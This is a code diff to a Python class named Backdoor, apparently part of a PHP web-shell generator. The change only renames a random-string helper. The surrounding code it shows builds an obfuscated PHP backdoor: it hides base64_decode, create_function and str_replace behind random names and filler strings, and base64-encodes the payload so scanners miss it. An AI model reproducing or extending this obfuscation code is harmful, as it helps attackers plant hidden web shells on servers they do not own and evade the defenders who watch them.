@@ -19,7 +19,8 @@
 
 import base64, codecs
 from random import random, randrange, choice, shuffle
-from pollution import random_string, pollute_with_static_str
+from pollution import pollute_with_static_str
+from core.utils import randstr
 from core.moduleexception import ModuleException
 
 class Backdoor:
@@ -62,19 +63,19 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 
 	def encode_template(self):
 		
-		b64_new_func_name = random_string()
+		b64_new_func_name = randstr()
 		b64_pollution, b64_polluted = pollute_with_static_str('base64_decode',frequency=0.7)
 		
-		createfunc_name = random_string()
+		createfunc_name = randstr()
 		createfunc_pollution, createfunc_polluted = pollute_with_static_str('create_function',frequency=0.7)
 		
-		payload_var = [ random_string() for st in range(4) ]
+		payload_var = [ randstr() for st in range(4) ]
 		payload_pollution, payload_polluted = pollute_with_static_str(base64.b64encode(self.payload))
 		
-		replace_new_func_name = random_string()
+		replace_new_func_name = randstr()
 		repl_pollution, repl_polluted = pollute_with_static_str('str_replace',frequency=0.7)
 		
-		final_func_name = random_string()
+		final_func_name = randstr()
 		
 		length  = len(payload_polluted)
 		offset = 7
